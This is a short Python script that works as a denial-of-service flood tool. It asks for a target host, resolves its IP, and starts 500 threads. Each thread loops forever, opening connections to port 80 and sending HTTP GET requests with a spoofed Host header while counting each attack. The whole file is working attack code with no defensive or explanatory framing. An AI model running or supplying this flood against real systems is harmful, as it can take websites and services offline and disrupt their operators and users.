import socket
import threading



host = input('Enter target URL or IP: ') # web address
ip = socket.gethostbyname(host)

print(f'IP of {host} is {ip}')

target = ip
fake_ip = '182.21.20.32'
port = 80

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()



